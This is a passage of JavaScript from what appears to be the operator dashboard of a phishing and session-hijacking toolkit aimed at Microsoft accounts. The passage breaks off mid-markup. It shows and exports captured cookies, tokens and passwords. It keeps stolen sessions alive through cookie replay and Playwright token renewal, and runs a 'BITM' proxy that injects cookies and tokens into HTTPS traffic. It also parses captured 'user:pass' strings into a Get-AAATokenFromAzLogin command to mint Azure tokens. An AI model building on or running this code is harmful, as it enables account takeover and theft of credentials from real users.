      return`<div style="padding:4px 0;border-bottom:1px solid #1a1a2e;color:#94a3b8"><span style="color:#78859b">${t}</span> Cycle complete: ${e.checked} checked, <span style="color:#4ade80">${e.valid} valid</span>, <span style="color:#f87171">${e.expired} expired</span>, ${e.skipped} skipped</div>`;
    }
    return`<div style="padding:4px 0;border-bottom:1px solid #1a1a2e;color:#78859b"><span>${t}</span> ${esc(JSON.stringify(e))}</div>`;
  }).join('');
}
// Track the most-recently-diagnosed site so the "Run reauth trace"
// and "Run remote /me" toggles know which site_id to re-fire against.
let _kaDiagSite='';
// Cache the most recent diagnostic payload so the Copy / Save
// buttons can dump the full original message — the rendered HTML
// strips almost everything.
let _kaLastDiagnostic=null;
function _kaDiagnosticTxt(d){
  if(!d)return '(no diagnostic)';
  const lines=[];
  const t=d.token||{}, l=d.local_check||{}, r=d.remote_check||{};
  const c=d.captured_state||{}, ra=d.reauth||{}, fs=d.failure_state||{};
  lines.push('# Keepalive diagnostic');
  lines.push('site_id: '+(d.site_id||''));
  lines.push('hostname: '+(d.hostname||''));
  lines.push('captured_at: '+new Date().toISOString());
  if(fs && (fs.paused || fs.consecutive_failures)){
    lines.push('');
    lines.push('## Failure state');
    lines.push('paused: '+(fs.paused?'true':'false'));
    lines.push('consecutive_failures: '+(fs.consecutive_failures||0));
    if(fs.paused_at)lines.push('paused_at: '+new Date(fs.paused_at*1000).toISOString());
    if(fs.paused_reason)lines.push('paused_reason: '+fs.paused_reason);
  }
  lines.push('');
  lines.push('## Token');
  lines.push('present: '+(t.present?'yes':'no'));
  lines.push('source: '+(t.source||'-'));
  lines.push('length: '+(t.length||0));
  if(t.exp)lines.push('exp: '+t.exp+' ('+new Date(t.exp*1000).toISOString()+')');
  if(t.expires_in!=null)lines.push('expires_in_secs: '+t.expires_in);
  lines.push('expired: '+(t.expired?'yes':'no'));
  if(t.decoded_claims){
    lines.push('decoded_claims:');
    for(const [k,v] of Object.entries(t.decoded_claims)){
      lines.push('  '+k+': '+(typeof v==='object'?JSON.stringify(v):v));
    }
  }
  lines.push('');
  lines.push('## Captured state');
  lines.push('cookies_count: '+(c.cookies_count||0));
  lines.push('has_refresh_token: '+(c.has_refresh_token?'yes':'no'));
  lines.push('has_id_token: '+(c.has_id_token?'yes':'no'));
  lines.push('age_seconds: '+(c.age_seconds==null?'-':c.age_seconds));
  lines.push('current_url: '+(c.current_url||'-'));
  if(c.cookie_names && c.cookie_names.length)
    lines.push('cookie_names: '+c.cookie_names.join(', '));
  lines.push('');
  lines.push('## Local check');
  lines.push('valid: '+(l.valid===true?'true':l.valid===false?'false':'-'));
  if(l.expires_in!=null)lines.push('expires_in: '+l.expires_in);
  if(l.error)lines.push('error: '+l.error);
  lines.push('');
  lines.push('## Remote /me');
  if(r.skipped){lines.push('skipped: true')}
  else{
    lines.push('valid: '+(r.valid===true?'true':r.valid===false?'false':'-'));
    if(r.status_code)lines.push('status_code: '+r.status_code);
    if(r.user)lines.push('user: '+r.user);
    if(r.error)lines.push('error: '+r.error);
  }
  lines.push('');
  lines.push('## Cookie-replay reauth');
  if(!ra.attempted){
    lines.push('attempted: false');
    if(ra.skipped_reason)lines.push('skipped_reason: '+ra.skipped_reason);
  } else {
    lines.push('attempted: true');
    lines.push('target_url: '+(ra.target_url||'-'));
    lines.push('cookies_sent: '+(ra.cookies_sent||0));
    lines.push('response_status: '+(ra.response_status||'-'));
    if(ra.response_url)lines.push('response_url: '+ra.response_url);
    lines.push('found_token: '+(ra.found_token||'NONE'));
    if(ra.new_token_len)lines.push('new_token_len: '+ra.new_token_len);
    if(ra.new_token_source)lines.push('new_token_source: '+ra.new_token_source);
    if(ra.body_parse_error)lines.push('body_parse_error: '+ra.body_parse_error);
    if(ra.error)lines.push('error: '+ra.error);
    if(ra.response_headers){
      lines.push('response_headers:');
      for(const [k,v] of Object.entries(ra.response_headers)){
        lines.push('  '+k+': '+v);
      }
    }
    if(ra.body_snippet){
      lines.push('body_snippet:');
      for(const ln of String(ra.body_snippet).split('\n'))lines.push('  '+ln);
    }
  }
  if(d.history && d.history.length){
    lines.push('');
    lines.push('## History (rolling, oldest first)');
    for(const h of d.history){
      const t=h.ts?new Date(h.ts*1000).toISOString():'-';
      lines.push(`  ${t}  valid=${h.valid===null?'no-token':h.valid} http=${h.http||'-'} exp_in=${h.expires_in==null?'-':h.expires_in}s cookies=${h.cookies||0} captured_age=${h.captured_age==null?'-':h.captured_age}s`);
    }
  }
  if(d.recommendations && d.recommendations.length){
    lines.push('');
    lines.push('## Recommendations');
    d.recommendations.forEach((rec,i)=>lines.push((i+1)+'. '+rec));
  }
  return lines.join('\n');
}
async function kaCopyDiagnostic(){
  if(!_kaLastDiagnostic){alert('No diagnostic loaded');return}
  const text=JSON.stringify(_kaLastDiagnostic,null,2);
  try{
    await navigator.clipboard.writeText(text);
    // Brief inline confirmation.
    const el=document.getElementById('keepalive-debug-result');
    if(el){
      const note=document.createElement('div');
      note.style.cssText='margin-top:6px;padding:4px 10px;font-size:11px;color:#86efac;background:#064e3b;border-radius:3px;display:inline-block';
      note.textContent='✓ Copied JSON ('+text.length+' chars) to clipboard';
      el.appendChild(note);
      setTimeout(()=>{try{note.remove()}catch(_){}},2500);
    }
  }catch(e){
    alert('Clipboard write failed: '+e+'\n\nFalling back to a download. Check your Downloads.');
    kaSaveDiagnostic();
  }
}
function _kaTriggerDownload(content, filename, mime){
  const blob=new Blob([content],{type:mime});
  const url=URL.createObjectURL(blob);
  const a=document.createElement('a');
  a.href=url; a.download=filename;
  document.body.appendChild(a);
  a.click();
  setTimeout(()=>{try{a.remove();URL.revokeObjectURL(url)}catch(_){}}, 200);
  const el=document.getElementById('keepalive-debug-result');
  if(el){
    const note=document.createElement('div');
    note.style.cssText='margin-top:6px;padding:4px 10px;font-size:11px;color:#86efac;background:#064e3b;border-radius:3px;display:inline-block';
    note.textContent='✓ Saved '+filename+' ('+content.length+' chars)';
    el.appendChild(note);
    setTimeout(()=>{try{note.remove()}catch(_){}},2500);
  }
}
function kaSaveDiagnostic(){
  if(!_kaLastDiagnostic){alert('No diagnostic loaded');return}
  const ts=new Date().toISOString().replace(/[:.]/g,'-');
  const sid=(_kaLastDiagnostic.site_id||'unknown').replace(/[^A-Za-z0-9_]/g,'_');
  _kaTriggerDownload(JSON.stringify(_kaLastDiagnostic,null,2),
                      `keepalive_diag_${sid}_${ts}.json`,
                      'application/json');
}
function kaSaveDiagnosticTxt(){
  if(!_kaLastDiagnostic){alert('No diagnostic loaded');return}
  const ts=new Date().toISOString().replace(/[:.]/g,'-');
  const sid=(_kaLastDiagnostic.site_id||'unknown').replace(/[^A-Za-z0-9_]/g,'_');
  _kaTriggerDownload(_kaDiagnosticTxt(_kaLastDiagnostic),
                      `keepalive_diag_${sid}_${ts}.txt`,
                      'text/plain');
}
function kaDiagnose(siteId, opts){
  if(!siteId){alert('No site_id on this log entry');return}
  _kaDiagSite=siteId;
  opts=opts||{};
  const el=document.getElementById('keepalive-debug-result');
  if(el){el.style.display='';el.innerHTML=`<div style="color:#94a3b8">Running diagnostic for <code>${esc(siteId)}</code>… ${opts.include_reauth?'(with cookie-replay GET — up to 15s)':''}${opts.include_remote?'(with Graph /me check — up to 15s)':''}</div>`}
  send({cmd:'keepalive_diagnose',site_id:siteId,
        include_remote:!!opts.include_remote,
        include_reauth:!!opts.include_reauth});
}
function kaDiagnoseDeep(){
  if(!_kaDiagSite){alert('Run a quick diagnose first.');return}
  kaDiagnose(_kaDiagSite,{include_remote:true,include_reauth:true});
}
function kaDiagnoseReauth(){
  if(!_kaDiagSite){alert('Run a quick diagnose first.');return}
  kaDiagnose(_kaDiagSite,{include_reauth:true});
}
function kaResume(siteId){
  if(!siteId){alert('No site_id');return}
  send({cmd:'keepalive_resume',site_id:siteId});
}
function kaPwRefresh(siteId){
  if(!siteId){alert('No site_id');return}
  const el=document.getElementById('keepalive-debug-result');
  if(el){
    const note=document.createElement('div');
    note.id='ka-pw-running';
    note.style.cssText='margin-top:8px;padding:8px 12px;background:#0c4a6e;color:#7dd3fc;border-radius:4px;font-size:13px';
    note.textContent='Running Playwright refresh — up to ~12s (chromium navigates to current_url, waits for MSAL silent renewal)…';
    el.appendChild(note);
  }
  send({cmd:'keepalive_pw_refresh_now',site_id:siteId});
}
function kaDiagnoseFirst(){
  // Pick the most recent `check` entry's site_id.
  for(let i=keepaliveLogEntries.length-1;i>=0;i--){
    const e=keepaliveLogEntries[i];
    if(e.event==='check' && e.site_id){kaDiagnose(e.site_id);return}
  }
  alert('No check entries with site_id yet — wait for one keep-alive cycle to run.');
}
function _kaRenderDiagnostic(d){
  const el=document.getElementById('keepalive-debug-result');
  if(!el)return;
  if(d.error){
    el.innerHTML=`<div style="color:#f87171"><b>Diagnostic failed:</b> ${esc(d.error)}</div>`;
    if(d.traceback)el.innerHTML+=`<pre style="font-size:11px;color:#94a3b8;margin-top:6px;max-height:240px;overflow:auto">${esc(d.traceback)}</pre>`;
    return;
  }
  const t=d.token||{}, l=d.local_check||{}, r=d.remote_check||{},
        c=d.captured_state||{}, ra=d.reauth||{};
  const expColor=t.expired?'#f87171':(t.expires_in!=null && t.expires_in<300?'#fbbf24':'#4ade80');
  const expText=t.expired?`EXPIRED ${Math.abs(t.expires_in||0)}s ago`
                          :(t.expires_in!=null?`expires in ${t.expires_in}s`:'no exp claim');
  const recs=(d.recommendations||[]).map(r=>`<li>${esc(r)}</li>`).join('');
  // History sparkline — each cycle's snapshot rendered as a coloured
  // chip so the operator can see the lifetime curve at a glance even
  // when they weren't watching live.
  const hist=d.history||[];
  let histBlock='';
  if(hist.length){
    const rows=hist.slice(-30).map(h=>{
      const t=h.ts?new Date(h.ts*1000).toLocaleTimeString():'?';
      let color='#94a3b8', label='—';
      if(h.valid===true){color='#4ade80';label='ok'}
      else if(h.valid===false){color='#f87171';label='exp'}
      else if(h.valid===null){color='#fbbf24';label='no-token'}
      const expIn=h.expires_in!=null?`exp_in=${h.expires_in}s`:'';
      const tip=`${t} · ${label} · ${expIn} · cookies=${h.cookies||0} · http=${h.http||'—'}`;
      return `<span title="${esc(tip)}" style="display:inline-block;width:10px;height:18px;background:${color};margin-right:1px;border-radius:1px;vertical-align:middle"></span>`;
    }).join('');
    const last=hist[hist.length-1];
    const summary=`${hist.length} snapshot${hist.length===1?'':'s'}` +
      (last && last.expires_in!=null?` · last exp_in=${last.expires_in}s`:'') +
      (last && last.captured_age!=null?` · captured_age=${last.captured_age}s`:'');
    histBlock=`<div style="margin:10px 0">
      <div style="color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px">History (rolling) <span style="color:#64748b;font-weight:normal;text-transform:none;letter-spacing:0">— ${esc(summary)} · hover for per-cycle detail</span></div>
      <div style="margin-top:4px">${rows}</div>
    </div>`;
  }else{
    histBlock=`<div style="margin:10px 0;color:#78859b;font-size:12px">No history yet — keep-alive hasn't run a cycle for this site since startup. Wait one interval (default 5 min) or hit Debug after the next cycle.</div>`;
  }

  // Pause banner — when N consecutive failures stopped the loop
  // from checking this site, surface it loudly with a Resume button
  // so the operator can re-arm after fixing the underlying capture.
  const fs=d.failure_state||{};
  let pauseBlock='';
  if(fs.paused){
    const pausedAt=fs.paused_at?new Date(fs.paused_at*1000).toLocaleString():'?';
    pauseBlock=`<div style="background:#7f1d1d;color:#fecaca;padding:8px 14px;border-radius:4px;border-left:3px solid #ef4444;margin:0 0 10px 0">
      <b>Keep-alive PAUSED</b> for this site after ${esc(String(fs.consecutive_failures||0))} consecutive failure${fs.consecutive_failures===1?'':'s'} at ${esc(pausedAt)}.
      <span style="display:block;font-size:12px;color:#fecaca;margin-top:2px">Reason: ${esc(fs.paused_reason||'unknown')}</span>
      <span style="display:block;font-size:12px;color:#fecaca;margin-top:2px">Subsequent cycles skip this site entirely — no log entries, no Slack, no upstream HTTP.</span>
      <button class="btn" style="margin-top:6px;padding:2px 10px;font-size:12px;background:#0c4a6e;color:#7dd3fc;border-color:#0ea5e9" onclick="kaResume('${esc(d.site_id||'')}')">Resume keep-alive</button>
    </div>`;
  } else if(fs.consecutive_failures){
    pauseBlock=`<div style="background:#1e1b00;color:#fef08a;padding:6px 12px;border-radius:4px;border-left:3px solid #fbbf24;margin:0 0 10px 0;font-size:12px">
      ${esc(String(fs.consecutive_failures||0))} consecutive failure${fs.consecutive_failures===1?'':'s'} — one more will pause this site.
    </div>`;
  }

  // Stash the raw diagnostic payload so the Copy / Save buttons can
  // emit it verbatim (the rendered HTML strips most context). Only
  // the most recent click is kept — same scope as the visible panel.
  _kaLastDiagnostic=d;
  el.innerHTML=`
    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px">
      <h3 style="margin:0;color:#7dd3fc">Diagnostic — ${esc(d.hostname||d.site_id||'?')}</h3>
      <div style="display:flex;gap:6px">
        <button class="btn" style="padding:1px 8px;font-size:11px" onclick="kaCopyDiagnostic()" title="Copy the full diagnostic payload (token claims, history, reauth trace, recommendations) to the clipboard as JSON.">Copy</button>
        <button class="btn" style="padding:1px 8px;font-size:11px" onclick="kaSaveDiagnostic()" title="Save the full diagnostic payload to a JSON file in your Downloads folder.">Save .json</button>
        <button class="btn" style="padding:1px 8px;font-size:11px" onclick="kaSaveDiagnosticTxt()" title="Save a flat human-readable text dump to your Downloads folder.">Save .txt</button>
        <button class="btn" style="padding:1px 8px;font-size:11px" onclick="document.getElementById('keepalive-debug-result').style.display='none'">Dismiss</button>
      </div>
    </div>
    ${pauseBlock}
    ${histBlock}
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:8px">
      <div>
        <div style="color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px">Token</div>
        <div>present: ${t.present?'<span style="color:#4ade80">yes</span>':'<span style="color:#f87171">no</span>'} · source: <code>${esc(t.source||'—')}</code> · len: ${t.length||0}</div>
        <div>exp: <span style="color:${expColor}">${esc(expText)}</span></div>
        ${t.decoded_claims?`<details style="margin-top:4px"><summary style="cursor:pointer;color:#94a3b8">Decoded claims</summary><pre style="font-size:11px;color:#cbd5e1;margin:4px 0 0 0;max-height:160px;overflow:auto">${esc(JSON.stringify(t.decoded_claims,null,2))}</pre></details>`:''}
      </div>
      <div>
        <div style="color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px">Captured state</div>
        <div>cookies: <b>${c.cookies_count||0}</b> · refresh-cookie: ${c.has_refresh_token?'<span style="color:#4ade80">yes</span>':'<span style="color:#fbbf24">no</span>'} · id_token stored: ${c.has_id_token?'yes':'no'}</div>
        <div>captured ${c.age_seconds!=null?`<b>${c.age_seconds}s</b> ago`:'?'}</div>
        ${c.cookie_names && c.cookie_names.length?`<details style="margin-top:4px"><summary style="cursor:pointer;color:#94a3b8">Cookie names (${c.cookie_names.length})</summary><div style="font-size:11px;color:#cbd5e1;margin-top:4px">${c.cookie_names.map(n=>`<code style="color:#fbbf24;margin-right:6px">${esc(n)}</code>`).join('')}</div></details>`:''}
      </div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:14px">
      <div>
        <div style="color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px">Local check</div>
        <div>${l.valid===true?'<span style="color:#4ade80">VALID</span>':l.valid===false?'<span style="color:#f87171">EXPIRED</span>':'<span style="color:#94a3b8">—</span>'} ${l.expires_in!=null?`(exp_in ${l.expires_in}s)`:''} ${l.error?`<span style="color:#f87171">${esc(l.error)}</span>`:''}</div>
      </div>
      <div>
        <div style="color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px">Remote /me</div>
        ${r.skipped?'<div><span style="color:#94a3b8">skipped</span> <button class="btn" style="padding:1px 8px;font-size:11px;margin-left:6px;background:#0c4a6e;color:#7dd3fc" onclick="kaDiagnose(_kaDiagSite,{include_remote:true})">Run /me check</button></div>'
        :`<div>${r.valid===true?'<span style="color:#4ade80">VALID</span>':r.valid===false?'<span style="color:#f87171">FAIL</span>':'<span style="color:#94a3b8">—</span>'} ${r.status_code?`HTTP ${r.status_code}`:''} ${r.user?` · ${esc(r.user)}`:''} ${r.error?`<span style="color:#f87171">${esc(r.error)}</span>`:''}</div>`}
      </div>
    </div>
    <div style="margin-top:14px">
      <div style="color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px">Cookie-replay reauth</div>
      ${(!ra.attempted && /not requested/.test(ra.skipped_reason||''))?`<div><span style="color:#94a3b8">skipped (saves a 3-15 s cookie-replay GET)</span> <button class="btn" style="padding:1px 8px;font-size:11px;margin-left:6px;background:#0c4a6e;color:#7dd3fc" onclick="kaDiagnoseReauth()">Run reauth trace</button></div>`
      :ra.attempted?`
        <div>target: <code>${esc(ra.target_url||'')}</code></div>
        <div>cookies sent: ${ra.cookies_sent||0} · response: <b>HTTP ${esc(String(ra.response_status||'?'))}</b> ${ra.response_url?`→ <code style="color:#94a3b8">${esc(ra.response_url)}</code>`:''}</div>
        <div>found token: ${ra.found_token?`<span style="color:#4ade80">${esc(ra.found_token)} (len ${ra.new_token_len||0})</span>`:'<span style="color:#fbbf24">NONE</span>'}</div>
        ${ra.error?`<div style="color:#f87171">error: ${esc(ra.error)}</div>`:''}
        ${ra.body_parse_error?`<div style="color:#fbbf24;font-size:12px">${esc(ra.body_parse_error)}</div>`:''}
        <details style="margin-top:6px"><summary style="cursor:pointer;color:#94a3b8">Response headers + body snippet</summary>
          <pre style="font-size:11px;color:#cbd5e1;margin:4px 0 0 0;max-height:200px;overflow:auto">${esc(JSON.stringify(ra.response_headers||{},null,2))}\n\n--- body ---\n${esc(ra.body_snippet||'(empty)')}</pre>
        </details>
      `:`<div style="color:#fbbf24">skipped — ${esc(ra.skipped_reason||'unknown reason')}</div>`}
    </div>
    ${recs?`<div style="margin-top:14px;padding:10px 14px;background:#0c1530;border-left:3px solid #fbbf24;border-radius:0 3px 3px 0">
      <div style="color:#fbbf24;font-size:12px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px">Likely cause / fix</div>
      <ul style="margin:0;padding-left:20px;color:#cbd5e1">${recs}</ul>
    </div>`:''}
    <div style="margin-top:10px;display:flex;gap:8px">
      <button class="btn" style="padding:4px 12px;font-size:12px;background:#7c2d12;color:#fed7aa;border-color:#c2410c"
        onclick="kaPwRefresh('${esc(d.site_id||'')}')"
        title="Run the dedicated-Playwright SPA refresh ad-hoc — bypasses keepalive_playwright_fallback_enabled. Up to 12s. On success the new token is persisted and the failure counter resets.">⚡ Try Playwright refresh</button>
    </div>
  `;
}
function appendKeepaliveLog(entry){
  keepaliveLogEntries.push(entry);
  // Trim to 12 hours
  const cutoff=Date.now()/1000-(12*3600);
  while(keepaliveLogEntries.length&&(keepaliveLogEntries[0].ts||0)<cutoff)keepaliveLogEntries.shift();
  if(currentTab==='keepalive-log')renderKeepaliveLog();
}

// ── Auth Proxy ──
let authProxyStatus={running:false,request_count:0,inject_count:0};
function renderAuthProxy(){
  const badge=document.getElementById('auth-proxy-badge'),info=document.getElementById('auth-proxy-info');
  const caEl=document.getElementById('auth-proxy-ca'),caPath=document.getElementById('auth-proxy-ca-path');
  if(authProxyStatus.running){
    badge.textContent='running';badge.className='badge badge-live';
    info.innerHTML=`Requests: ${authProxyStatus.request_count||0} &nbsp;|&nbsp; Injected: <span style="color:#4ade80">${authProxyStatus.inject_count||0}</span>`;
  }else{
    badge.textContent='stopped';badge.className='badge badge-dead';info.textContent='';
  }
  if(authProxyStatus.ca_cert_path){
    caPath.textContent=authProxyStatus.ca_cert_path;
    if(authProxyStatus.bitm_enabled){
      caEl.style.display='';
      caEl.innerHTML=`<span style="color:#4ade80">&#10003;</span> BITM enabled — HTTPS cookie/token injection active`;
    }else{
      caEl.style.display='';
      caEl.innerHTML=`<span style="color:#fbbf24">&#9888;</span> HTTP-only mode — install <code>cryptography</code> for HTTPS injection`;
    }
  }
}
function startAuthProxy(){
  const port=Number(document.getElementById('auth-proxy-port').value)||3128;
  if(port<3100||port>3199){
    if(!confirm(`Port ${port} is outside the host-published range 3100-3199. The proxy will bind inside the container but localhost:${port} on your host will NOT be reachable unless you add '-p ${port}:${port}' to run.sh and restart. Continue anyway?`))return;
  }
  send({cmd:'start_auth_proxy',port});
}
function stopAuthProxy(){send({cmd:'stop_auth_proxy'})}

// ── Active sessions sidebar ──
function renderSessions(data){
  for(const[sid,info]of Object.entries(data))ensureSession(sid,info);
}

// ── Saved sessions ──
function renderSaved(){
  const el=document.getElementById('saved-list');
  if(!savedSessions.length){el.innerHTML='<div style="color:#78859b;font-size:13px">No saved sessions.</div>';return}
  el.innerHTML=savedSessions.map(s=>`<div class="card"><div class="card-header">
    <div><div style="color:#ccc;font-weight:600">${esc(s.name)}</div><div style="color:#7dd3fc;font-size:13px">${esc(s.login_url)}</div></div>
    <button class="btn btn-danger" onclick="send({cmd:'delete_saved_session',id:'${s.id}'})">Delete</button></div></div>`).join('');
}
function createSaved(){
  const n=document.getElementById('new-sess-name').value.trim(),u=document.getElementById('new-sess-url').value.trim();
  if(!n||!u)return;send({cmd:'create_saved_session',name:n,login_url:u});
  document.getElementById('new-sess-name').value='';document.getElementById('new-sess-url').value='';
}

// ── Captured credentials ──
function copyToClipboard(text,btn){
  navigator.clipboard.writeText(text).then(()=>{
    const orig=btn.textContent;btn.textContent='Copied!';btn.style.color='#4ade80';
    setTimeout(()=>{btn.textContent=orig;btn.style.color=''},1500);
  });
}
// Per-card Copy / Export. Both pull the credential record straight from
// sitesCache (no new endpoint) so what the operator sees is exactly what
// they get. Tokens, cookies and captured_inputs all serialize as-is —
// the trust model is the same as the inline per-field Copy buttons that
// already exist next to individual headers / tokens.
function copyCred(siteId,btn){
  const site=sitesCache.find(s=>s.id===siteId);
  if(!site){btn.textContent='not found';btn.style.color='#f87171';setTimeout(()=>{btn.textContent='Copy';btn.style.color=''},1500);return}
  copyToClipboard(JSON.stringify(site.data||{},null,2),btn);
}
function exportCred(siteId){
  const site=sitesCache.find(s=>s.id===siteId);
  if(!site)return;
  const blob=new Blob([JSON.stringify(site.data||{},null,2)],{type:'application/json'});
  const a=document.createElement('a');
  a.href=URL.createObjectURL(blob);
  a.download=`credentials-${siteId}-${new Date().toISOString().slice(0,19).replace(/:/g,'-')}.json`;
  a.click();
  setTimeout(()=>URL.revokeObjectURL(a.href),2000);
}
// Shared user/password heuristic for the Captured Data card — used by
// both Get-AAATokenFromAzLogin and Test ROPC so the two features guess
// identically. First input that looks like an email is the user, first
// non-email input ≥4 chars is the password. captured_inputs is empty for
// flows that never went through DOM input observation (device-code,
// error-page bounces, programmatic auth) — falls back to d.user_id,
// the email the auth-completion path stamps from JWT claims/form events.
function guessUserPass(d){
  const inputsArray = Array.isArray(d.captured_inputs) ? d.captured_inputs :
                      (typeof d.captured_inputs === 'object' && d.captured_inputs ? Object.values(d.captured_inputs) : []);
  const inputs = inputsArray.filter(v=>typeof v==='string'&&v.length);
  const userIdFallback=(typeof d.user_id==='string'?d.user_id.trim():'');
  const emailAnywhere=/@[^@\s]+\.[^@\s]+/;
  // capture.py joins external/lander captures into a single "user:pass"
  // string, whereas in-band DOM capture stores each field as its own
  // entry. Recognise the combined shape (email before the first colon,
  // non-empty after) so ROPC/AAA pre-fill the password for those flows
  // too — the split is what "populate the password from that session if
  // captured" needs, since the password otherwise hides inside the pair.
  const combinedIdx=v=>{const i=v.indexOf(':');return (i>0 && emailAnywhere.test(v.slice(0,i)) && v.slice(i+1).length)?i:-1;};
  let guessUser='', guessPass='';
  for(const v of inputs){
    const i=combinedIdx(v);
    if(i>=0){ guessUser=v.slice(0,i); guessPass=v.slice(i+1); break; }
  }
  // Fall back to separate entries (in-band DOM capture), skipping any
  // combined "user:pass" string so it isn't mistaken for either field.
  if(!guessUser) guessUser=inputs.find(v=>emailAnywhere.test(v)&&combinedIdx(v)<0)||userIdFallback||'';
  if(!guessPass) guessPass=inputs.find(v=>v&&!emailAnywhere.test(v)&&combinedIdx(v)<0&&v.length>=4)||'';
  // Token-claims fallback: a credential minted from a token (ROPC / AAA /
  // device-code) has no typed inputs, but the captured token's OWN claims
  // carry the identity — still captured session data. (Password can't come
  // from a token, so guessPass has no token fallback.)
  if(!guessUser && Array.isArray(d.tokens)){
    for(const t of d.tokens){
      const tok=t&&(t.access_token||t.token||(typeof t==='string'?t:''));
      const dec=tok?_decodeJwt(tok):null;
      const c=dec&&(dec.payload||dec); // _decodeJwt wraps claims under .payload
      if(c){const u=c.preferred_username||c.upn||c.email||c.unique_name||'';if(u){guessUser=u;break;}}
    }
  }
  return {guessUser,guessPass};
}
// Get-AAATokenFromAzLogin PowerShell snippet for the Captured Data
// card. Tenant id comes from `default_tenant_id` config (Settings →
// Configuration). Display respects `mask_captured_input` for the
// password but the copy button always writes the unmasked command —
// masking exists to protect over-the-shoulder display, not to gate
// operator-driven copy actions.
function renderAaaTokenSnippet(d,siteId){
  const {guessUser,guessPass}=guessUserPass(d);
  const tid=(configCache.default_tenant_id||'').trim();
  const dispUser=guessUser||'<USER>';
  const dispPass=guessPass
    ?(configCache.mask_captured_input
        ?'•'.repeat(Math.min(guessPass.length,16))
        :guessPass)
    :'<PASSWORD>';
  const dispTid=tid||'<TENANT_ID>';
  // Captured creds are USER email/password → plain user login (no
  // -ServicePrincipal). Only add -ServicePrincipal when User is an app
  // (client) ID and Password is its secret; the login panel has a toggle for
  // that case.
  const cmdShown=`Get-AAATokenFromAzLogin -User "${dispUser}" -Password "${dispPass}" -TenantId "${dispTid}"`;
  const cmdCopy=`Get-AAATokenFromAzLogin -User "${guessUser||'<USER>'}" -Password "${guessPass||'<PASSWORD>'}" -TenantId "${tid||'<TENANT_ID>'}"`;
  const tidNote=tid?'':'<span style="color:#fbbf24">no <code>default_tenant_id</code> set — Settings → Configuration</span>';
  const userNote=guessUser?'':'<span style="color:#fbbf24">no captured email — placeholder only</span>';
  const passNote=guessPass?'':'<span style="color:#fbbf24">no captured password — placeholder only</span>';
  const notes=[tidNote,userNote,passNote].filter(Boolean).join(' · ');
  // Stash the unmasked copy command on a data attribute so the inline
  // onclick can hand it to copyToClipboard without re-running the
  // string-build (which depended on closure state).
  // Pre-fill the inline-run form's user/tenant from the heuristics;
  // password we never have for these flows so the operator types it.
  return `<div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
      <span style="color:#94a3b8;font-size:13px;font-weight:600">Get-AAATokenFromAzLogin:</span>
      <button class="btn" style="padding:2px 10px;font-size:12px;background:#1e3a5f"
              data-cmd="${esc(cmdCopy)}"
              onclick="copyToClipboard(this.dataset.cmd,this)">Copy command</button>
      ${notes?`<span style="font-size:11px;color:#78859b">${notes}</span>`:''}
    </div>
    <pre style="background:#0a0a14;padding:8px;border-radius:4px;color:#cbd5e1;font-size:12px;white-space:pre-wrap;word-break:break-all;margin:0">${esc(cmdShown)}</pre>
    <div style="margin-top:6px">
      <button class="btn" style="padding:3px 12px;font-size:12px;background:#3f1d1d;border-color:#7f1d1d;color:#fecaca"
              onclick="aaaLoginToggle('${siteId}')"
              title="Run via pwsh — Connect-AzAccount + Get-AzAccessToken — and stash the token in credentials">Run via pwsh… (acquire &amp; stash a token)</button>
    </div>
    <div id="aaa-login-${siteId}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #3f1d1d">
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:8px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">Method</label>
        <select id="aaa-login-method-${siteId}" class="cfg-input" style="font-size:13px;flex:1;min-width:260px" onchange="aaaLoginMethodChange('${siteId}')">
          <option value="password" selected>Password — Connect-AzAccount (needs Az.Accounts)</option>
          <option value="devicecode">Device code — Graph token, satisfies MFA</option>
        </select>
      </div>
      <div id="aaa-login-pw-${siteId}">
        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
          <label style="color:#94a3b8;font-size:13px;min-width:64px">User</label>
          <input id="aaa-login-user-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="${esc(guessUser)}">
        </div>
        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
          <label style="color:#94a3b8;font-size:13px;min-width:64px">Password</label>
          <input id="aaa-login-pass-${siteId}" type="password" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="paste — never logged" value="${esc(guessPass||'')}">
        </div>
      </div>
      <div id="aaa-login-dc-${siteId}" style="display:none;color:#78859b;font-size:11px;margin-bottom:6px">
        Click <b>Start device code</b> — enter the code at microsoft.com/devicelogin, complete sign-in (with MFA), and the Graph token is stashed on this credential for the AAA runner. No Az.Accounts or password needed.
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">Tenant</label>
        <input id="aaa-login-tid-${siteId}" class="cfg-input" style="flex:1;min-width:200px;font-size:13px" value="${esc(tid)}">
        <label id="aaa-login-sp-wrap-${siteId}" style="color:#94a3b8;font-size:13px;margin-left:6px;display:flex;align-items:center;gap:4px" title="Only when User is an app (client) ID and Password is its secret. Leave OFF for captured user email/password — a user login must not pass -ServicePrincipal."><input type="checkbox" id="aaa-login-sp-${siteId}"> -ServicePrincipal (app login)</label>
        <button id="aaa-login-go-${siteId}" class="btn" style="padding:3px 12px;font-size:13px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="aaaLoginGo('${siteId}')">▶ Run</button>
      </div>
      <div style="color:#78859b;font-size:11px;margin-bottom:6px">
